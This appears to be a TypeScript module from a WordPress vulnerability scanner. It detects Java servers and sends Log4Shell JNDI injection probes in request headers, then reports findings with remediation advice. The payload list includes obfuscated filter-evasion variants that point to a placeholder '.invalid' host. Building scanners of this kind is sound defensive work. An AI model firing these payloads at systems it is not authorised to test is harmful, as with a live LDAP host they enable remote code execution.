import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget } from '../utils.js';

const MODULE_NAME = 'Log4Shell / JNDI Injection Indicators';

// JNDI injection payloads for various headers
const JNDI_PAYLOADS = [
  '${jndi:ldap://jndi-test.jwpscanner.invalid/a}',
  '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://jndi-test.jwpscanner.invalid/a}',
  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://jndi-test.jwpscanner.invalid/a}',
  '${j${::-n}di:ldap://jndi-test.jwpscanner.invalid/a}',
];

// Headers to inject JNDI payloads into
const INJECTION_HEADERS = [
  'User-Agent',
  'X-Forwarded-For',
  'Referer',
  'X-Api-Version',
  'X-Forwarded-Host',
  'Accept-Language',
  'CF-Connecting-IP',
];

// Definitive Java server/framework indicators — checked in HTTP response headers only.
// IMPORTANT: Do NOT include "java" as a keyword — it matches "javascript" in every HTML page.
// Only match strings that unambiguously identify a Java runtime or Java application server.
const JAVA_SERVER_HEADERS = [
  'tomcat',
  'jetty',
  'jboss',
  'wildfly',
  'weblogic',
  'websphere',
  'glassfish',
  'payara',
  'resin',
];

// X-Powered-By values that confirm a Java stack
const JAVA_POWERED_BY = [
  'java',
  'jsp',
  'servlet',
  'spring',
  'struts',
  'jdk',
  'jre',
];

// PHP-based X-Powered-By values — if any of these are present the site is NOT a Java app
const PHP_POWERED_BY_PATTERNS = [
  'php',
];

// Java-specific response headers that only appear on Java app servers
const JAVA_SPECIFIC_HEADERS = [
  'x-application-context',  // Spring Boot
  'x-java-version',
];

// ElasticPress uses Elasticsearch (Java-based) as a backend, which could have Log4Shell risk.
// Polylang is a PHP multilingual plugin — NOT Java-related. Do NOT include it here.
const JAVA_PLUGIN_PATHS = [
  '/wp-content/plugins/elasticpress/readme.txt',
  '/wp-content/plugins/elasticsearch-indexer/readme.txt',
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    // Step 1: Fetch homepage headers to detect the application stack.
    const homepageRes = await fetchURL(target + '/', { timeoutMs: 5_000 });
    let javaDetected = false;
    let javaEvidence = '';
    let phpDetected = false;

    if (homepageRes) {
      const serverHeader = (homepageRes.headers.get('Server') ?? '').toLowerCase();
      const xPoweredBy = (homepageRes.headers.get('X-Powered-By') ?? '').toLowerCase();

      // Detect PHP stack — if PHP is the runtime, Log4Shell CANNOT apply here.
      // WordPress is a PHP application; all WordPress sites will have PHP indicators.
      if (PHP_POWERED_BY_PATTERNS.some(p => xPoweredBy.includes(p))) {
        phpDetected = true;
      }

      // Only check Java indicators if PHP was NOT detected.
      if (!phpDetected) {
        // Check Server header for Java app server names
        for (const javaServer of JAVA_SERVER_HEADERS) {
          if (serverHeader.includes(javaServer)) {
            javaDetected = true;
            javaEvidence = `java_server_header="${javaServer}" server="${serverHeader}"`;
            break;
          }
        }

        // Check X-Powered-By for Java runtime indicators
        if (!javaDetected) {
          for (const javaBy of JAVA_POWERED_BY) {
            if (xPoweredBy.includes(javaBy)) {
              javaDetected = true;
              javaEvidence = `java_powered_by="${javaBy}" x-powered-by="${xPoweredBy}"`;
              break;
            }
          }
        }

        // Check for Java-specific response headers (Spring Boot, etc.)
        if (!javaDetected) {
          for (const javaHeader of JAVA_SPECIFIC_HEADERS) {
            if (homepageRes.headers.get(javaHeader) !== null) {
              javaDetected = true;
              javaEvidence = `java_specific_header="${javaHeader}"`;
              break;
            }
          }
        }
      }
    }

    // Step 2: If this is a PHP site, Log4Shell does not apply — skip entirely.
    // WordPress IS a PHP application; there is no Java runtime involved.
    if (phpDetected) {
      return moduleResult(MODULE_NAME, target, findings, errors, start);
    }

    // Step 3: Check for Java-based WP plugins (e.g., ElasticPress uses Elasticsearch).
    // ElasticPress integrates with Elasticsearch (Java), which could have Log4Shell risk
    // if the WordPress site proxies requests to the Elasticsearch cluster.
    if (!javaDetected) {
      for (const pluginPath of JAVA_PLUGIN_PATHS) {
        const res = await fetchURL(target + pluginPath, { timeoutMs: 3_000 });
        if (res?.status === 200) {
          const text = await res.text().catch(() => '');
          if (text.includes('Stable tag:')) {
            const slug = pluginPath.match(/plugins\/([^/]+)\//)?.[1] ?? 'unknown';
            javaDetected = true;
            javaEvidence = `java_plugin="${slug}" (uses Elasticsearch/Java backend)`;
            break;
          }
        }
      }
    }

    // Step 4: If no Java indicators found at all, return no findings.
    // A site with no Java stack cannot be vulnerable to Log4Shell (CVE-2021-44228).
    if (!javaDetected) {
      return moduleResult(MODULE_NAME, target, findings, errors, start);
    }

    // Step 5: Genuine Java indicators found — send JNDI injection probes.
    const probesSent: string[] = [];
    const unusualResponses: string[] = [];

    const baselineRes = await fetchURL(target + '/', { timeoutMs: 4_000 });
    const baselineStatus = baselineRes?.status ?? 200;

    for (const payload of JNDI_PAYLOADS.slice(0, 2)) {
      for (const header of INJECTION_HEADERS.slice(0, 4)) {
        const res = await fetchURL(target + '/', {
          headers: { [header]: payload },
          timeoutMs: 5_000,
        });

        probesSent.push(`${header}: ${payload.slice(0, 50)}`);

        if (res && res.status !== baselineStatus && res.status >= 500) {
          unusualResponses.push(`${header} => HTTP ${res.status}`);
        }
      }
    }

    findings.push(finding(
      'LOG4SHELL_PROBE_SENT',
      'HIGH',
      target,
      `JNDI injection probes sent to ${probesSent.length} header/endpoint combinations. Java indicators confirmed (${javaEvidence}). DNS callback-based exploitation cannot be confirmed without out-of-band infrastructure.`,
      {
        evidence: `probes_sent=${probesSent.length} java_detected=true java_evidence="${javaEvidence}" unusual_responses=${unusualResponses.join('; ') || 'none'} sample_payload="${JNDI_PAYLOADS[0].slice(0, 60)}"`,
        remediation: 'Update Log4j to >= 2.17.1. Set log4j2.formatMsgNoLookups=true. Block JNDI patterns at WAF. Ensure WP is not fronting a Java application server.',
      },
    ));

    if (unusualResponses.length > 0) {
      findings.push(finding(
        'LOG4SHELL_UNUSUAL_RESPONSE',
        'HIGH',
        target,
        `Unusual HTTP responses triggered by JNDI header injection: ${unusualResponses.join(', ')}`,
        {
          evidence: unusualResponses.join(' | '),
          remediation: 'Investigate server-side Java components. Update Log4j. Apply WAF rules for JNDI patterns.',
        },
      ));
    }
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
